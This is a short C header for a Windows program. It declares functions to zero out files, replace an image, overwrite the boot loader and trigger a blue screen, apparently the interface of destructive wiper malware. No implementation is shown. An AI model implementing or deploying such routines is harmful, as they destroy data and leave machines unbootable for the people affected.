#ifndef UTILS_H
#define UTILS_H

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>

#define BUFFER_SIZE 4096
#define IMAGE_PATH "assets/image.png"
#define BOOTLOADER_PATH "bootloader.bin"

BOOL ZeroOutFile(LPCWSTR filename);
BOOL ZeroOutFiles();
BOOL ReplaceImage(LPCWSTR filename);
BOOL OverwriteBootloader();
void TriggerBSOD();

#endif